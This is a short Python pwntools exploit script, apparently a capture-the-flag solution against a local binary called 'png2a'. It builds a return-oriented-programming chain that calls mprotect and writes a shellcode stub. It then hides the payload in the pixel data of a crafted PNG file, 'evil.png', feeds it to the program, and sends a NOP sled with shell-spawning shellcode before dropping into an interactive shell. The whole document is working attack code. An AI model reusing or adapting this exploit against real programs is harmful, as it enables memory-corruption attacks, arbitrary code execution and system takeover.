from PIL import Image,PngImagePlugin
import numpy as np
from pwn import *
context.arch = "amd64"
h, w = 4*53,0x9a9
#0x0000000000401ad8: pop rdi; ret;
#0x0000000000404985: pop rsi; ret;
#0x00000000004123e5: pop rdx; ret;
#0x0000000000405c54: pop rax; ret;
#0x000000000040a7c5: syscall; ret;

x = asm("""
mov rsi,[rcx]
pop rax
pop rdi
syscall
""").ljust(0x10,'\x00')
shell =  u64(x[:8])
shell8 = u64(x[8:])

payload = "\x00"*0x1ff638 + flat(
0x405c54,0xa,0x401ad8,0x412000,0x404985,0x1000,0x4123e5,0x7,0x40a7c5,
0x403eeb,0x412c36,0x405c54,shell,0x04084cc,0,
0x403eeb,0x412c36+8,0x405c54,shell8,0x04084cc,0,
0x405c54,0x3c,0x40a7c5
)

print len(payload) < h*w*4
payload = map(ord,payload.ljust(h*w*4,'\x00'))

data = np.asarray(payload,dtype=np.uint8).reshape((h, w,4))
img = Image.fromarray(data, 'RGBA')
info = PngImagePlugin.PngInfo()
info.add_text("TXT", "VALUE")
img.save('evil.png',pnginfo=info)

r = process(["./png2a"])
IMAGE = 'evil.png'


data  = open(IMAGE).read()
r.send(p32(len(data))+p32(4*53)+p32(0x9a9))
r.recvrepeat(2)
r.send(data)
r.recvrepeat(2)
r.send(p64(0x412c36))
r.recvrepeat(2)
r.send("\x90"*0x30+asm(shellcraft.sh()))
r.interactive()


